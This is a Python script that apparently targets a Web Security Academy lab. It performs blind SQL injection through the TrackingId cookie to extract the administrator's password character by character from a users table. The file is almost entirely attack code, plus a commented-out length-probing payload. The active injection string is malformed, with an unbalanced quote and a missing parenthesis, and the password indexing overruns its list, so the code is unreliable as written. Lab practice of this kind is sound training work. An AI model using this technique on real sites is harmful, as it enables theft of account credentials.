import requests
import string
import concurrent.futures

url = "https://0a7e00130336e8aac023bd6f00e90000.web-security-academy.net/filter?category=Lifestyle"

# headers = {
#     "cookie": "TrackingId=CYODu99gJzjFELRv' and (select username from users where username='administrator' and length(password) > 19)='administrator'-- -"
# }

s = requests.Session()
chars = "0123456789" + string.ascii_letters

pwds = ['a'] * 20


def check_char(char, position):

    headers = {
        "cookie": f"TrackingId=CYODu99gJzjFELRv' and select SUBSTRING(password,{position},1) from users where username='administrator)={char}"
    }
    r = s.get(url, headers=headers)
    print('[!] trying ', char, position)
    if "Welcome back!" in r.text:
        print(position, '->', char)
        pwds[position] = char
        return True


for pos in range(1, 21):
    for char in chars:
        if check_char(char, pos):
            break

print(''.join(pwds))
